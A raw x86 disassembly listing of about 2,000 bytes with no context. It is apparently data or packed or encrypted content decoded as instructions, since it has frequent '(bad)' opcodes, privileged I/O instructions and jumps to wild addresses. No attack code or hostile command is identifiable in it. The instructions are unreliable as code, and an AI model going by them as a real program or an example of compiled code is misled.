  43454a:	or     esi,DWORD PTR [edi+esi*2]
  43454d:	mov    BYTE PTR [edi-0x758bf40f],bh
  434553:	out    dx,al
  434554:	je     0x43457a
  434556:	xchg   ebx,eax
  434557:	dec    esi
  434558:	mov    edi,0xd490e9
  43455d:	add    cl,dh
  43455f:	mov    BYTE PTR [ebx+edx*1],ah
  434562:	pusha  
  434563:	rol    DWORD PTR [ebx+0x75f12754],1
  434569:	add    BYTE PTR fs:[edi-0x43],ah
  43456d:	clc    
  43456e:	mov    bl,BYTE PTR [edi+0x34e930c1]
  434574:	xchg   edi,eax
  434575:	cli    
  434576:	inc    DWORD PTR ds:0xb002f81f
  43457c:	fiadd  DWORD PTR [ebx+0x7dbf77c0]
  434582:	into   
  434583:	in     al,dx
  434584:	lods   al,BYTE PTR ds:[esi]
  434585:	test   al,al
  434587:	push   edi
  434588:	jecxz  0x434608
  43458a:	inc    esi
  43458b:	adc    al,0xc1
  43458d:	ja     0x43459b
  43458f:	cli    
  434590:	fs inc ebx
  434592:	pop    ss
  434593:	bound  edi,QWORD PTR [esi+eax*2]
  434596:	adc    edx,esp
  434598:	popa   
  434599:	aaa    
  43459a:	mov    BYTE PTR [esi-0x18f6ec5a],ah
  4345a0:	mov    eax,0x3b62000b
  4345a5:	push   eax
  4345a6:	and    al,0x76
  4345a8:	(bad)  
  4345a9:	sti    
  4345aa:	jnp    0x43462a
  4345ac:	out    dx,al
  4345ad:	pop    es
  4345ae:	adc    DWORD PTR [esi],0x36
  4345b1:	mov    bh,0xf9
  4345b3:	fnstcw WORD PTR [esi-0x20]
  4345b6:	and    esp,edi
  4345b8:	stc    
  4345b9:	das    
  4345ba:	es jmp 0x89c6523c
  4345c0:	mov    fs,ebx
  4345c2:	test   BYTE PTR [ebp-0x4c7a4225],bl
  4345c8:	jb     0x434555
  4345ca:	retf   0x1395
  4345cd:	mov    eax,eax
  4345cf:	add    BYTE PTR [esi],dl
  4345d1:	int3   
  4345d2:	mov    al,BYTE PTR [edx+0x6d]
  4345d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4345d6:	or     DWORD PTR [ecx+eiz*2],0x3a
  4345da:	adc    DWORD PTR ds:[eax+ecx*4+0xf],ebp
  4345df:	jns    0x43463e
  4345e1:	cmp    eax,0xc2620ad6
  4345e6:	mov    ecx,DWORD PTR [esi+eax*4-0x5a]
  4345ea:	mov    eax,DWORD PTR [esi+edi*2-0x2a]
  4345ee:	jg     0x4345b7
  4345f0:	(bad)  
  4345f1:	call   0x45999e7f
  4345f6:	fidiv  DWORD PTR [ebp+eax*4+0x3b]
  4345fa:	mov    esi,0xd44b2325
  4345ff:	push   eax
  434600:	fld    DWORD PTR [edi-0x7e20324a]
  434606:	cmp    DWORD PTR [esi],eax
  434608:	call   0xde67540c
  43460d:	fsubr  st,st(5)
  43460f:	pop    es
  434610:	ficomp DWORD PTR [esi]
  434612:	out    dx,eax
  434613:	mov    ch,0xa0
  434615:	lock push cs
  434617:	or     eax,0x3d880e1
  43461c:	bound  esp,QWORD PTR [esi+eiz*1-0x18]
  434620:	push   ecx
  434621:	fs es call 0x38e4a465
  434628:	test   BYTE PTR [edx+edx*1+0x8],ah
  43462c:	loope  0x4345e1
  43462e:	(bad)  
  43462f:	loopne 0x434617
  434631:	lahf   
  434632:	adc    eax,ebx
  434634:	add    bh,bl
  434636:	test   eax,0xd7a888ba
  43463b:	cmp    eax,DWORD PTR [edi-0x760bb35e]
  434641:	and    al,dh
  434643:	std    
  434644:	adc    DWORD PTR [esi-0x25],0xcf734661
  43464b:	mov    al,ds:0x64e81b14
  434650:	xor    bl,BYTE PTR [eax-0x27]
  434653:	jmp    0xca405ce0
  434658:	xchg   BYTE PTR [ebp+0x1688b84c],ah
  43465e:	std    
  43465f:	aad    0x88
  434661:	pop    ss
  434662:	in     eax,dx
  434663:	pop    esp
  434664:	fldz   
  434666:	sti    
  434667:	(bad)  
  434668:	lds    eax,FWORD PTR [edi-0x4d2c9c68]
  43466e:	bound  esi,QWORD PTR [eax-0x55a2e044]
  434674:	aaa    
  434675:	pop    esp
  434676:	arpl   WORD PTR [eax],bp
  434678:	adc    eax,0x5d65f86
  43467d:	jmp    0x36ee:0xa0b5d71f
  434684:	or     eax,0xe70115e1
  434689:	popa   
  43468a:	(bad)  [ebx+0x58130a25]
  434690:	inc    edi
  434691:	lods   eax,DWORD PTR ds:[esi]
  434692:	sub    al,0x84
  434694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434695:	std    
  434696:	xchg   esp,eax
  434697:	or     ecx,ebp
  434699:	add    BYTE PTR [esi-0x75],ch
  43469c:	les    esp,FWORD PTR [ebx-0x1f]
  43469f:	mov    ecx,0x5d662984
  4346a4:	shr    esi,0xdd
  4346a7:	mov    esp,0x5c61e906
  4346ac:	push   ebp
  4346ad:	lds    edi,FWORD PTR [ebp+0x4ff6dc5b]
  4346b3:	cdq    
  4346b4:	or     BYTE PTR [ebp+0xd555ea6],ah
  4346ba:	retf   0x3f98
  4346bd:	jmp    0x55bf:0xe83f9b61
  4346c4:	jmp    0x8448b493
  4346c9:	inc    ecx
  4346ca:	ins    BYTE PTR es:[edi],dx
  4346cb:	dec    ebp
  4346cc:	pop    ss
  4346cd:	push   0xffffffc9
  4346cf:	(bad)  [ecx+edi*8+0x19]
  4346d3:	loopne 0x434752
  4346d5:	dec    edx
  4346d6:	pop    eax
  4346d7:	fld    DWORD PTR [eax]
  4346d9:	das    
  4346da:	daa    
  4346db:	xlat   BYTE PTR ds:[ebx]
  4346dc:	add    BYTE PTR [eax],al
  4346de:	stos   BYTE PTR es:[edi],al
  4346df:	sar    eax,cl
  4346e1:	push   es
  4346e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4346e3:	sbb    eax,DWORD PTR [ebx]
  4346e5:	out    0xb8,al
  4346e7:	xchg   edi,eax
  4346e8:	div    esi
  4346ea:	sbb    DWORD PTR [ebx-0x41a314c1],ebx
  4346f0:	mov    edx,0xbfd009e7
  4346f5:	daa    
  4346f6:	pop    esp
  4346f7:	(bad)  
  4346f8:	jmp    0xf9133f96
  4346fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4346fe:	add    BYTE PTR [eax+0x12002fd6],ah
  434704:	cmp    bh,bl
  434706:	jmp    esp
  434708:	loope  0x4346bc
  43470a:	inc    esi
  43470b:	or     DWORD PTR [esi+eax*8-0x80],esp
  43470f:	sar    DWORD PTR [ebp+esi*2-0x761ce908],0xd9
  434717:	sti    
  434718:	fld    DWORD PTR [eax]
  43471a:	jg     0xb434890
  434720:	pop    edi
  434721:	jmp    0x77993b26
  434726:	(bad)  
  434727:	fs xchg edx,eax
  434729:	pop    edi
  43472a:	or     DWORD PTR [ecx-0x3a],esi
  43472d:	mov    dh,0xf
  43472f:	aas    
  434730:	or     bh,bl
  434732:	inc    DWORD PTR [ebp+eiz*1+0x6d]
  434736:	pop    ss
  434737:	adc    esp,ebx
  434739:	jl     0x4347a8
  43473b:	adc    eax,0xff8bfa92
  434740:	mov    ch,0x10
  434742:	mov    ch,bh
  434744:	fadd   st(2),st
  434746:	inc    esi
  434747:	mov    ecx,0x555ddfd9
  43474c:	xchg   edx,eax
  43474d:	cli    
  43474e:	adc    BYTE PTR [eax-0x43],0x9
  434752:	test   bh,cl
  434754:	(bad)  
  434755:	cli    
  434756:	call   DWORD PTR [eax]
  434758:	and    DWORD PTR ds:0xab49118,ebx
  43475e:	mov    WORD PTR [edx+0xe0],?
  434764:	sti    
  434765:	xchg   ebp,eax
  434766:	xor    BYTE PTR [edi],cl
  434768:	hlt    
  434769:	and    al,0xc
  43476b:	add    BYTE PTR [ebx+0x7],cl
  43476e:	add    DWORD PTR [edi],ecx
  434770:	test   DWORD PTR [edi+ebx*2+0x50b440a],ebx
  434777:	sub    edi,edx
  434779:	(bad)  
  43477a:	jae    0x434784
  43477c:	bound  ecx,QWORD PTR [ecx-0x79]
  43477f:	fsubr  st,st(1)
  434781:	cwde   
  434782:	lods   al,BYTE PTR ds:[esi]
  434783:	push   edx
  434784:	cmp    bl,al
  434786:	add    al,0xfd
  434788:	or     eax,0x8c35a6b0
  43478d:	mov    esi,0xb5707e0b
  434792:	add    al,0x0
  434794:	xchg   ebp,eax
  434795:	leave  
  434796:	neg    DWORD PTR [ecx+0x5a]
  434799:	ret    
  43479a:	jle    0x43479d
  43479c:	outs   dx,DWORD PTR ds:[esi]
  43479d:	ret    0x8504
  4347a0:	and    DWORD PTR [eax+0x5bea7dc1],esp
  4347a6:	or     eax,DWORD PTR [eax+ebp*8-0x14fffb3a]
  4347ad:	fmul   QWORD PTR [eax]
  4347af:	test   DWORD PTR [esi-0x62],eax
  4347b2:	cld    
  4347b3:	xchg   BYTE PTR [edx+ecx*8],ch
  4347b6:	xchg   BYTE PTR [esi+edi*2-0x31],cl
  4347ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4347bb:	jmp    0xbf1c:0xfabb2bbf
  4347c2:	xchg   BYTE PTR [edx+0x61],cl
  4347c5:	inc    edx
  4347c6:	mov    ch,0x1
  4347c8:	add    BYTE PTR ds:0xa3b20bdd,ch
  4347ce:	enter  0xd494,0xbc
  4347d2:	add    BYTE PTR [ebx+esi*2],0x68
  4347d6:	inc    edi
  4347d7:	dec    eax
  4347d8:	and    al,0x6e
  4347da:	inc    edx
  4347db:	mov    ch,0x2
  4347dd:	call   0x65502060
  4347e2:	cmp    eax,0xdb6dfbc7
  4347e7:	rol    DWORD PTR [edx+0x60],0xb2
  4347eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4347ec:	mov    esi,0xc2bacb5f
  4347f1:	pushf  
  4347f2:	rol    BYTE PTR [eiz*8-0x439526dd],0x58
  4347fa:	dec    ebp
  4347fb:	xor    al,0x85
  4347fd:	cmp    ah,ah
  4347ff:	push   ebp
  434800:	movzx  ebx,WORD PTR [ecx-0x28d57a26]
  434807:	out    dx,al
  434808:	xor    BYTE PTR [ecx-0x2c],0xb7
  43480c:	mov    ecx,0x10062ce7
  434811:	std    
  434812:	aaa    
  434813:	loop   0x434818
  434815:	(bad)  
  434817:	sub    BYTE PTR ds:0x83eb22dc,al
  43481d:	cmc    
  43481e:	fst    QWORD PTR [esi]
  434820:	aam    0x6b
  434822:	mov    ebp,DWORD PTR [ecx+0x48c0ddfe]
  434828:	inc    esp
  434829:	bound  ecx,QWORD PTR [esi-0x63]
  43482c:	lea    eax,[eax]
  43482e:	ss std 
  434830:	aad    0x83
  434832:	int    0xdc
  434834:	arpl   WORD PTR [eax-0x7a],cx
  434837:	call   0xd693c72a
  43483c:	push   edi
  43483d:	mov    ecx,0x15ec1aa0
  434842:	mov    ebp,0xabb94545
  434847:	shr    BYTE PTR [eax-0x14dd23fc],cl
  43484d:	adc    DWORD PTR [ebp+0x6b63b6de],0xffffff8b
  434854:	sub    esi,edi
  434856:	fnsave [eax+ecx*2+0x6d4e6244]
  43485d:	lea    edx,[esi]
  43485f:	std    
  434860:	cmc    
  434861:	sub    eax,0xcbd4315d
  434866:	in     al,0x24
  434868:	(bad)  
  434869:	adc    al,0x5b
  43486b:	pop    esi
  43486c:	sahf   
  43486d:	mov    dh,0x5b
  43486f:	rol    DWORD PTR [ecx],cl
  434871:	xor    DWORD PTR [eax-0x46],0x53
  434875:	out    0x61,al
  434877:	fld    DWORD PTR [ebx+0xef4265]
  43487d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43487e:	mov    ds:0x11c032d2,eax
  434883:	loop   0x434885
  434885:	jmp    0x164560ad
  43488a:	stc    
  43488b:	div    ebp
  43488d:	mov    esi,0xc1c75cda
  434892:	add    BYTE PTR [ebx-0x7316ff21],ah
  434898:	cdq    
  434899:	ins    DWORD PTR es:[edi],dx
  43489a:	not    ebx
  43489c:	xlat   BYTE PTR ds:[ebx]
  43489d:	add    edx,DWORD PTR [ebx]
  43489f:	bound  esi,QWORD PTR [ecx]
  4348a1:	imul   edi,eax,0xffffff98
  4348a4:	loopne 0x4348e2
  4348a6:	test   al,0xbe
  4348a8:	aam    0x33
  4348aa:	test   eax,0xc54d5ca1
  4348af:	ins    DWORD PTR es:[edi],dx
  4348b0:	popa   
  4348b1:	aas    
  4348b2:	call   0x645c5c9d
  4348b7:	mov    eax,ds:0x60aa7ce0
  4348bc:	fld    DWORD PTR [eax]
  4348be:	jb     0x43486b
  4348c0:	rcl    cl,1
  4348c2:	ins    BYTE PTR es:[edi],dx
  4348c3:	mov    eax,ds:0xf5317ce0
  4348c8:	sar    al,1
  4348ca:	jae    0x4348ef
  4348cc:	call   0xd8a8aeed
  4348d1:	jmp    0xf91415f6
  4348d6:	imul   ecx,esi,0xb26d07de
  4348dc:	aad    0xf8
  4348de:	push   ds
  4348df:	loope  0x4348ad
  4348e1:	or     esp,esi
  4348e3:	cmc    
  4348e4:	sahf   
  4348e5:	cmc    
  4348e6:	push   cs
  4348e7:	stos   BYTE PTR es:[edi],al
  4348e8:	pop    ebx
  4348e9:	aas    
  4348ea:	add    BYTE PTR [edx+esi*4+0x7f510c7e],al
  4348f1:	pop    ecx
  4348f2:	or     al,0x4b
  4348f4:	(bad)  
  4348f5:	cmp    bl,0x0
  4348f8:	test   DWORD PTR [edx],0xb23589ff
  4348fe:	sti    
  4348ff:	or     al,0x4a
  434901:	pop    esi
  434902:	add    ebp,ebx
  434904:	jbe    0x434963
  434906:	out    dx,al
  434907:	inc    ebp
  434908:	or     al,0x59
  43490a:	lds    ecx,FWORD PTR [ebx]
  43490c:	cmp    edx,esi
  43490e:	and    BYTE PTR [esi],0xdf
  434911:	xchg   edx,eax
  434912:	inc    ebx
  434913:	push   ss
  434914:	or     DWORD PTR [ebx+eax*2+0x4393f903],edx
  43491b:	add    DWORD PTR [ecx],ecx
  43491d:	test   DWORD PTR [ebx-0x7e762304],edx
  434923:	or     BYTE PTR es:[edi+0x4b],dl
  434927:	or     ah,bl
  434929:	push   ebp
  43492a:	dec    ebx
  43492b:	or     al,0xdc
  43492d:	pop    esp
  43492e:	out    dx,al
  43492f:	or     cl,ah
  434931:	push   ecx
  434932:	push   ebx
  434933:	cld    
  434934:	dec    esp
  434935:	mov    al,BYTE PTR [ecx+0x7cdaaefb]
  43493b:	dec    ebp
  43493c:	aas    
  43493d:	mov    bh,dl
  43493f:	add    BYTE PTR [eax+0x25],0xa
  434943:	test   DWORD PTR [ecx],edi
  434945:	fiadd  WORD PTR [eax]
  434947:	add    BYTE PTR [ebp+0x1204f813],al
  43494d:	into   
  43494e:	cld    
  43494f:	call   FWORD PTR [ebp+ebx*2-0x12]
  434953:	push   esp
  434954:	jl     0x4349ae
  434956:	sahf   
  434957:	add    DWORD PTR [ebx-0x2b],edi
  43495a:	ret    0x46
  43495d:	jp     0x434932
  43495f:	fist   WORD PTR [ebp+0x5f]
  434962:	mov    bh,dl
  434964:	and    BYTE PTR [edx-0x19],0x50
  434968:	or     edi,esp
  43496a:	dec    eax
  43496b:	(bad)  
  43496c:	jmp    DWORD PTR [edx+0x2]
  43496f:	aaa    
  434970:	jmp    DWORD PTR [ecx+ebp*8+0x43]
  434974:	cld    
  434975:	push   ebp
  434976:	enter  0xf584,0xb2
  43497a:	scas   eax,DWORD PTR es:[edi]
  43497b:	add    DWORD PTR [ecx-0x3dfb3d9d],0xe70cc1a4
  434985:	jae    0x43492d
  434987:	scas   eax,DWORD PTR es:[edi]
  434988:	stc    
  434989:	loop   0x434936
  43498b:	fisttp WORD PTR [eax]
  43498d:	fisttp WORD PTR ds:0x2c62fffe
  434993:	push   es
  434994:	pop    eax
  434995:	jmp    0xaf7e:0x6fe6fe00
  43499c:	stc    
  43499d:	xlat   BYTE PTR ds:[ebx]
  43499e:	add    ecx,ebp
  4349a0:	cmp    al,0x6b
  4349a2:	mov    edi,0xc2693b77
  4349a7:	add    al,0x62
  4349a9:	pop    ebp
  4349aa:	and    bl,al
  4349ac:	bound  edi,QWORD PTR [ecx]
  4349ae:	(bad)  
  4349af:	loopne 0x4349c8
  4349b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4349b2:	clc    
  4349b3:	std    
  4349b4:	add    eax,0x1036393c
  4349b9:	mov    ebx,0xc5f9bb3e
  4349be:	inc    edx
  4349bf:	mov    ebx,0xc937002a
  4349c4:	mov    dh,0x42
  4349c6:	arpl   WORD PTR [ebx+0x1fa9eaa5],di
  4349cc:	scas   eax,DWORD PTR es:[edi]
  4349cd:	ss push es
  4349cf:	ficom  WORD PTR [ecx+ecx*1]
  4349d2:	out    dx,al
  4349d3:	mov    edi,0x4262000b
  4349d8:	mov    ebx,0xf62f5d37
  4349dd:	add    al,0x62
  4349df:	fldl2t 
  4349e1:	sbb    eax,0x1dfa1fe7
  4349e6:	jmp    DWORD PTR [ecx-0x70a4e21c]
  4349ec:	sub    ebx,DWORD PTR ds:0xea889867
  4349f2:	test   eax,0xdd1de1f5
  4349f7:	push   ds
  4349f8:	fidivr DWORD PTR [ebx+0x43]
  4349fb:	fsub   st(1),st
  4349fd:	add    eax,eax
  4349ff:	adc    al,0xb2
  434a01:	add    eax,0x3f4b8e3
  434a06:	bound  esp,QWORD PTR [ebx+0x1e]
  434a09:	loopne 0x434a69
  434a0b:	ret    0xb976
  434a0e:	sub    edx,eax
  434a10:	ins    DWORD PTR es:[edi],dx
  434a11:	inc    ecx
  434a12:	xor    cl,BYTE PTR ds:0x9ce304f1
  434a18:	in     al,0x3
  434a1a:	bound  esi,QWORD PTR [edi]
  434a1c:	xlat   BYTE PTR ds:[ebx]
  434a1d:	jne    0x4349e6
  434a1f:	sar    DWORD PTR ss:[edi],cl
  434a22:	inc    esi
  434a23:	icebp  
  434a24:	lahf   
  434a25:	ds add ch,dh
  434a28:	jecxz  0x434a31
  434a2a:	mov    esp,DWORD PTR [eax-0x10767f15]
  434a30:	iret   
  434a31:	jg     0x4349b7
  434a33:	xlat   BYTE PTR ds:[ebx]
  434a34:	clc    
  434a35:	in     al,dx
  434a36:	or     ah,BYTE PTR [eax-0x3af916ea]
  434a3c:	dec    ebp
  434a3d:	jae    0x4349f4
  434a3f:	retf   
  434a40:	adc    bh,BYTE PTR [esi+0x65e055df]
  434a46:	xchg   esi,eax
  434a47:	pop    esp
  434a48:	fldl2t 
  434a4a:	xor    DWORD PTR [edi-0x2e7b28ef],0xffffffe2
  434a51:	jmp    0xa8a74a59
  434a56:	adc    DWORD PTR [eax],eax
  434a58:	inc    esp
  434a59:	add    DWORD PTR [eax],esp
  434a5b:	pop    eax
  434a5c:	cmp    ecx,DWORD PTR [eax]
  434a5e:	outs   dx,DWORD PTR ds:[esi]
  434a5f:	mov    ds:0x5c31043a,eax
  434a64:	test   BYTE PTR [ebp+eax*8+0x59],0x3b
  434a69:	mov    ah,BYTE PTR [edi+0x5c86b653]
  434a6f:	and    ebp,DWORD PTR [ecx-0x14710fcb]
  434a75:	pop    esi
  434a76:	out    dx,al
  434a77:	iret   
  434a78:	mov    WORD PTR [edi-0x3e],ds
  434a7b:	(bad)  
  434a7c:	cmc    
  434a7d:	sbb    BYTE PTR [edi],ah
  434a7f:	test   dh,cl
  434a81:	push   es
  434a82:	dec    edi
  434a83:	jmp    0x331357a3
  434a88:	xabort 0xd6
  434a8b:	add    cl,ah
  434a8d:	les    esp,FWORD PTR [ecx]
  434a8f:	fisub  WORD PTR [ebp-0x29390409]
  434a95:	push   edi
  434a96:	aas    
  434a97:	(bad)  
  434a98:	xor    eax,0xb8e50563
  434a9d:	test   DWORD PTR [ebx],ecx
  434a9f:	jmp    0xb987ad05
  434aa4:	cmc    
  434aa5:	xlat   BYTE PTR ds:[ebx]
  434aa6:	outs   dx,DWORD PTR ds:[esi]
  434aa7:	(bad)  
  434aa8:	push   edi
  434aa9:	push   esp
  434aaa:	inc    edi
  434aab:	std    
  434aac:	dec    edi
  434aad:	xor    al,0xca
  434aaf:	jecxz  0x434af8
  434ab1:	loopne 0x434a69
  434ab3:	stos   BYTE PTR es:[edi],al
  434ab4:	jg     0x434a82
  434ab6:	rol    BYTE PTR [edi],0xcb
  434ab9:	and    bl,BYTE PTR ds:0x4b849d1
  434abf:	jmp    0xb7cd8625
  434ac4:	ins    DWORD PTR es:[edi],dx
  434ac5:	cmp    edi,DWORD PTR [ecx+esi*1]
  434ac8:	xchg   BYTE PTR [edx+ebp*8-0x72f08ee],dl
  434acf:	imul   ebp,edx,0x71006cd7
  434ad5:	push   ebp
  434ad6:	out    dx,al
  434ad7:	or     eax,0xfb80e9cf
  434adc:	pop    ebx
  434add:	(bad)  
  434ade:	mov    cl,0xc6
  434ae0:	mov    ebp,0x23e909db
  434ae5:	nop
  434ae6:	cli    
  434ae7:	dec    DWORD PTR [ebx]
  434ae9:	xchg   ecx,eax
  434aea:	or     al,0x75
  434aec:	or     BYTE PTR [ebx+eax*2-0x7c94ffff],0xbf
  434af4:	cli    
  434af5:	test   DWORD PTR fs:[ecx-0x7c2aae05],eax
  434afc:	rcl    DWORD PTR [ecx-0x76],0xfa
  434b00:	(bad)  
  434b01:	std    
  434b02:	fisubr DWORD PTR [ebx]
  434b04:	jmp    0x3dca0c
  434b09:	retf   
  434b0a:	jle    0x434b0b
  434b0c:	jae    0x434b17
  434b0e:	dec    edi
  434b0f:	inc    ebx
  434b10:	pop    ss
  434b11:	pop    edi
  434b12:	pop    edi
  434b13:	add    eax,0xfec8321a
  434b18:	dec    DWORD PTR [ebx]
  434b1a:	pop    edx
  434b1b:	out    dx,al
  434b1c:	or     eax,0xfa9b5604
  434b21:	mov    ah,0x89
  434b23:	cmp    ebx,0x957cdaf1
  434b29:	ror    DWORD PTR [ecx-0x28e27f06],0x75
  434b30:	dec    esi
  434b31:	add    ecx,DWORD PTR [ebx-0x7528b18a]
  434b37:	jg     0x434afc
  434b39:	(bad)  
  434b3a:	mov    ecx,0x53c4613c
  434b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434b40:	or     DWORD PTR [ebx-0x4b85cb27],edi
  434b46:	bound  ebx,QWORD PTR [edi+0x9d9cb09]
  434b4c:	mov    esi,0x42cb0362
  434b51:	dec    esp
  434b52:	ror    dl,0x42
  434b55:	add    BYTE PTR [ecx-0x3f],ah
  434b58:	jg     0x434b52
  434b5a:	and    al,0x8f
  434b5c:	ss je  0x434b7f
  434b5f:	inc    ebx
  434b60:	xchg   ebp,eax
  434b61:	cmp    eax,0x743cc70e
  434b66:	dec    esp
  434b67:	inc    ebx
  434b68:	xchg   ebp,eax
  434b69:	std    
  434b6a:	icebp  
  434b6b:	mov    ds:0x4348743c,al
  434b70:	xchg   ebp,eax
  434b71:	add    al,0xee
  434b73:	lods   al,BYTE PTR ds:[esi]
  434b74:	cmp    al,0x9
  434b76:	out    0x56,eax
  434b78:	cmc    
  434b79:	call   DWORD PTR [ebp-0xb]
  434b7c:	dec    edx
  434b7d:	adc    bl,BYTE PTR [eax-0x29]
  434b80:	sbb    eax,0x7c6a5b66
  434b85:	inc    edx
  434b86:	push   esp
  434b87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434b88:	inc    ebp
  434b89:	ret    0xc49c
  434b8c:	(bad)  
  434b8d:	in     al,0x91
  434b8f:	jl     0x434bdb
  434b91:	adc    ah,BYTE PTR [ebx-0x69]
  434b94:	inc    ecx
  434b95:	ret    0xaca4
  434b98:	add    al,0xe5
  434b9a:	popf   
  434b9b:	je     0x434be7
  434b9d:	adc    ah,BYTE PTR [edi-0x69]
  434ba0:	cmp    eax,0x19a49cc2
  434ba5:	in     eax,0x39
  434ba7:	aas    
  434ba8:	pushf  
  434ba9:	dec    ecx
  434baa:	outs   dx,BYTE PTR ds:[esi]
  434bab:	mov    al,0x3c
  434bad:	je     0x434bea
  434baf:	cli    
  434bb0:	xor    al,0x74
  434bb2:	inc    ebp
  434bb3:	cli    
  434bb4:	cmp    BYTE PTR [edx],dl
  434bb6:	sub    cl,dh
  434bb8:	add    DWORD PTR [eax+0x0],ecx
  434bbb:	gs xor eax,0xc26206fb
  434bc1:	retf   0x6c42
  434bc4:	stos   DWORD PTR es:[edi],eax
  434bc5:	xchg   edi,eax
  434bc6:	sbb    al,0xa4
  434bc8:	fldenv [edi-0xf3f9ce7]
  434bce:	leave  
  434bcf:	and    bl,ah
  434bd1:	neg    DWORD PTR [esi+0x19a09352]
  434bd7:	jb     0x434b99
  434bd9:	hlt    
  434bda:	leave  
  434bdb:	and    bl,ah
  434bdd:	jmp    0x6019:0xa893669e
  434be4:	xchg   ebx,eax
  434be5:	mov    al,ds:0x4ec26c04
  434bea:	lods   al,BYTE PTR ds:[esi]
  434beb:	jnp    0x434bb9
  434bed:	pop    esi
  434bee:	into   
  434bef:	pop    ebx
  434bf0:	push   ebp
  434bf1:	out    0xfc,al
  434bf3:	gs int3 
  434bf5:	fs inc ecx
  434bf7:	jo     0x434bd5
  434bf9:	aaa    
  434bfa:	(bad)  
  434bfb:	(bad)  
  434bfd:	pop    esp
  434bfe:	pop    ebx
  434bff:	rcl    DWORD PTR ds:0xf94f83ea,0x6c
  434c06:	sbb    ah,ah
  434c08:	cmp    ch,bl
  434c0a:	add    al,dh
  434c0c:	xchg   ebp,eax
  434c0d:	push   0xfffffff0
  434c0f:	pop    ebp
  434c10:	fst    DWORD PTR [ebx+edi*8+0x23]
  434c14:	adc    ebp,ecx
  434c16:	adc    al,0x5
  434c18:	(bad)  
  434c19:	call   0x48a2ae21
  434c1e:	add    eax,0xa5835b00
  434c23:	out    dx,al
  434c24:	imul   ebp,ecx,0xda5887d6
  434c2a:	jmp    0xde152e32
  434c2f:	cmp    BYTE PTR ss:[ecx-0x73],bl
  434c33:	add    esi,DWORD PTR [ecx-0x25]
  434c36:	imul   ebp,DWORD PTR [ebp-0x360eb9d6],0x9adbe320
  434c40:	pusha  
  434c41:	fiadd  DWORD PTR [eax]
  434c43:	jmp    0xec39a5a9
  434c48:	bound  ebx,QWORD PTR [eax+0x13]
  434c4b:	lock popa 
  434c4d:	fld    DWORD PTR [eax+0x7de21662]
  434c53:	loopne 0x434bfd
  434c55:	retf   
  434c56:	clc    
  434c57:	daa    
  434c58:	sub    bh,ah
  434c5a:	or     BYTE PTR [eax-0x9],dl
  434c5d:	fadd   DWORD PTR [eax]
  434c5f:	jmp    0xbc4f1045
  434c64:	sub    ebx,DWORD PTR [ecx-0xa]
  434c67:	call   0x22c451a0
  434c6c:	and    ecx,DWORD PTR [eax+0xa]
  434c6f:	daa    
  434c70:	sbb    bh,ah
  434c72:	or     eax,DWORD PTR [eax]
  434c74:	(bad)  
  434c75:	fadd   DWORD PTR [eax]
  434c77:	jmp    0x7c461b5d
  434c7c:	inc    eax
  434c7d:	dec    ebx
  434c7e:	cld    
  434c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434c80:	xchg   esp,eax
  434c81:	sar    BYTE PTR [esi-0x2394ff51],cl
  434c87:	jmp    0x11cb2b5
  434c8c:	imul   eax,DWORD PTR [ebx+ecx*8],0xc4e1ef6d
  434c93:	es pop esp
  434c95:	sub    DWORD PTR [ecx-0x4d8a08c1],ebx
  434c9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434c9c:	jmp    0xbcc42602
  434ca1:	addr16 loopne 0x434d21
  434ca4:	jo     0x434caf
  434ca6:	retf   
  434ca7:	clc    
  434ca8:	imul   ecx,esi,0x716c080a
  434cae:	loope  0x434cb0
  434cb0:	jmp    0x619c2704
  434cb5:	fwait
  434cb6:	out    0xe9,eax
  434cb8:	jns    0x434d1b
  434cba:	fld    DWORD PTR [eax]
  434cbc:	add    BYTE PTR [ebx+0x7f],cl
  434cbf:	adc    esi,DWORD PTR [ebp-0x3d]
  434cc2:	push   esi
  434cc3:	cld    
  434cc4:	add    DWORD PTR [ebx+edx*2-0x2934f76e],edi
  434ccb:	cmp    bl,0x6
  434cce:	fiadd  DWORD PTR [ebx+0xd6b38e]
  434cd4:	(bad)  
  434cd5:	cmc    
  434cd6:	lock or ch,bl
  434cd9:	mov    eax,0xd601fc56
  434cde:	lods   al,BYTE PTR ds:[esi]
  434cdf:	js     0x434cda
  434ce1:	js     0x434ce6
  434ce3:	and    al,0x80
  434ce5:	push   eax
  434ce6:	and    al,0x74
  434ce8:	push   es
  434ce9:	add    BYTE PTR [ebp+0x20],al
  434cec:	adc    ecx,DWORD PTR [eax+edx*2]
  434cef:	sub    BYTE PTR [ecx+0x303b6fb],al
  434cf5:	(bad)  
  434cf6:	mov    ch,0xf0
  434cf8:	cld    
  434cf9:	jmp    0x534c:0x41ee5618
  434d00:	pop    edx
  434d01:	or     BYTE PTR [ebx],bh
  434d03:	(bad)  
  434d04:	ret    0x2546
  434d07:	(bad)  
  434d09:	inc    esp
  434d0a:	retf   
  434d0b:	jnp    0x434d04
  434d0d:	je     0x434d7a
  434d0f:	push   ebp
  434d10:	lock add al,0x96
  434d13:	into   
  434d14:	js     0x434d11
  434d16:	imul   edx,DWORD PTR [eax],0xe345c634
  434d1c:	por    mm5,QWORD PTR [ebp+edx*2-0x10]
  434d21:	orps   xmm5,XMMWORD PTR [edi+0x1068fb78]
  434d28:	and    al,0xc6
  434d2a:	inc    ebp
  434d2b:	jecxz  0x434d3e
  434d2d:	jmp    0x434d8b
  434d2f:	push   ebp
  434d30:	cld    
  434d31:	add    al,0xfc
  434d33:	pusha  
  434d34:	ret    
  434d35:	pop    es
  434d36:	(bad)  
  434d37:	rol    BYTE PTR [eax+eax*4],0xdb
  434d3b:	stos   DWORD PTR es:[edi],eax
  434d3c:	test   DWORD PTR [edx+0x4bb17],0x94d56e2
  434d46:	fisttp WORD PTR [ebx]
  434d48:	add    BYTE PTR [eax],al
